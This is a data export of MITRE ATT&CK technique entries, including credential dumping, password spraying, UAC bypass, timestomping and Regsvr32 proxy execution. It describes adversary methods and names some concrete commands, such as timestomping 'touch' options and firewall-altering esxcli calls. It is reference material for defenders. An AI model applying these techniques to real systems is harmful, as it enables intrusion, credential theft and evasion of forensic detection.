attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077,14,T1124,System Time Discovery,"An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)

On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.

In addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)

This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:37Z
attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317,14,T1566.003,Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T19:24:00Z
attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22,13,T1003,OS Credential Dumping,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.
","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:19Z
attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c,13,T1069.002,Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.","Linux, macOS, Windows",FALSE,FALSE,2020-02-21T21:15:06Z
attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a,13,T1560,Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","Linux, macOS, Windows",FALSE,FALSE,2020-02-20T20:53:45Z
attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a,13,T1114.002,Remote Email Collection,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.","Office Suite, Windows",FALSE,FALSE,2020-02-19T18:52:24Z
attack-pattern--eec096b8-c207-43df-b6c1-11523861e452,13,T1686,Disable or Modify System Firewall,"Adversaries may disable or modify host-based or network firewalls to impair defensive mechanisms and enable further action. Once an adversary has gathered sufficient privileges, they can tamper with firewall services, policies, or rule sets to remove restrictions on inbound or outbound traffic. For example, this may include turning off firewall profiles, altering existing rules to permit previously blocked ports or protocols, or adding new rules that create covert communication paths (e.g., adding a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port.(Citation: change_rdp_port_conti)

Adversaries may disable or modify firewalls using different behaviors, depending on the platform. For example, in ESXi, firewall rules may be modified directly via the esxcli (e.g., via esxcli network firewall set) or via the vCenter user interface.(Citation: Broadcom ESXi Firewall)(Citation: Trellix Rnasomhouse 2024)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2026-04-14T22:53:27Z
attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0,12,T1555,Credentials from Password Stores,"Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.","IaaS, Linux, macOS, Windows",FALSE,FALSE,2020-02-11T18:48:28Z
attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7,12,T1219,Remote Access Tools,"An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.

Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.

Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)","Linux, macOS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925,12,T1199,Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.

Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)

In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)","IaaS, Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b,12,T1095,Non-Application Layer Protocol,"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:10Z
attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d,12,T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

Additionally, adversaries may name files in a manner that would allow the file to be hidden such as naming a file only a “space” character.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.","Linux, macOS, Windows",FALSE,FALSE,2020-02-26T17:46:13Z
attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2,12,T1078.003,Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.","Containers, ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-13T20:26:46Z
attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c,11,T1132.001,Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-14T23:36:52Z
attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073,11,T1548.002,Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",Windows,FALSE,FALSE,2020-01-30T14:24:34Z
attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc,11,T1016.001,Internet Connection Discovery,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites, or performing initial speed testing to confirm bandwidth.

Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.","Windows, Linux, macOS, ESXi",FALSE,FALSE,2021-03-17T15:28:10Z
attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72,11,T1071.004,DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)

DNS beaconing may be used to send commands to remote systems via DNS queries. A DNS beacon is created by tunneling DNS traffic (i.e. [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)). The commands may be embedded into different DNS records, for example, TXT or A records.(Citation: OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government) DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices.(Citation: DNS Beacons) Infrequent communication conceals the malicious DNS traffic with normal DNS traffic.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-15T16:27:31Z
attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d,11,T1559.002,Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",Windows,FALSE,FALSE,2020-02-12T14:10:50Z
attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0,11,T1074.002,Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2020-03-13T21:14:58Z
attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611,11,T1070.006,Timestomp,"Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.

In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)

Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)

Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)

In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)

Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-01-31T12:42:44Z
attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c,11,T1110.003,Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In order to avoid detection thresholds, adversaries may deliberately throttle password spraying attempts to avoid triggering security alerting. Additionally, adversaries may leverage LDAP and Kerberos authentication attempts, which are less likely to trigger high-visibility events such as Windows ""logon failure"" event ID 4625 that is commonly triggered by failed SMB connection attempts.(Citation: Microsoft Storm-0940)","Containers, ESXi, IaaS, Identity Provider, Linux, Network Devices, Office Suite, SaaS, Windows, macOS",FALSE,FALSE,2020-02-11T18:39:25Z
attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3,11,T1090.002,External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.

External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-14T23:12:18Z
attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82,11,T1210,Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)

Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.","Linux, Windows, macOS, ESXi",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d,11,T1090.003,Multi-hop Proxy,"Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.

For example, adversaries may construct or use onion routing networks – such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.(Citation: ORB Mandiant) 

In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  

Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-14T23:23:41Z
attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab,11,T1218.010,Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",Windows,FALSE,FALSE,2020-01-23T19:52:17Z
attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada,11,T1573.002,Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.

For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-16T15:48:33Z
attack-pattern--d4287702-e2f7-4946-bdfa-2c7f5aaa5032,11,T1219.002,Remote Desktop Software,"An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) 
 
Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop.(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)","Linux, macOS, Windows",FALSE,FALSE,2025-03-24T22:24:47Z
attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58,11,T1518,Software Discovery,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.

Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2019-09-16T17:52:44Z
attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e,11,T1550.002,Pass the Hash,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",Windows,FALSE,FALSE,2020-01-30T16:36:51Z
